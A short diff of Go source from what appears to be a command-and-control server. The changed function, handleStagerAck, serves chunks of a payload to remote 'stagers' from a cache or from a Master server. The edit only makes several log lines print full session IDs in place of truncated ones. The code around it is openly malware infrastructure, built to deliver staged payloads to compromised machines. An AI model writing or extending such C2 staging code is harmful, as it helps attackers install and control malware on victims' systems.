@@ -1527,7 +1527,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 			chunkData, err := c2.db.GetCachedChunk(cachedSession.ClientBinaryID, chunkIndex)
 			if err == nil && chunkData != "" {
 				if !isDuplicate {
-					logf("[C2] 🚀 Serving chunk %d from cache (session: %s)", chunkIndex, sessionID[:16])
+					logf("[C2] 🚀 Serving chunk %d from cache (session: %s)", chunkIndex, sessionID)
 				}
 
 				// Update cached session stats
@@ -1558,14 +1558,14 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 		cachedChunk, err := c2.db.GetCachedChunk(sessionID, chunkIndex)
 		if err == nil && cachedChunk != "" {
 			if !isDuplicate {
-				logf("[C2] 🚀 Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID[:16])
+				logf("[C2] 🚀 Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID)
 			}
 			return fmt.Sprintf("CHUNK|%s", cachedChunk)
 		}
 
 		// Full cache miss - query Master
 		if !isDuplicate {
-			logf("[C2] Cache MISS: chunk %d for session %s, querying Master...", chunkIndex, sessionID[:16])
+			logf("[C2] Cache MISS: chunk %d for session %s, querying Master...", chunkIndex, sessionID)
 		}
 
 		chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
@@ -1587,7 +1587,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 
 		if !isDuplicate {
 			logf("[C2] Serving chunk %d/%d for stager %s (session: %s)",
-				chunkIndex, chunkResp.ChunkIndex, stagerIP, sessionID[:16])
+				chunkIndex, chunkResp.ChunkIndex, stagerIP, sessionID)
 		}
 
 		// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
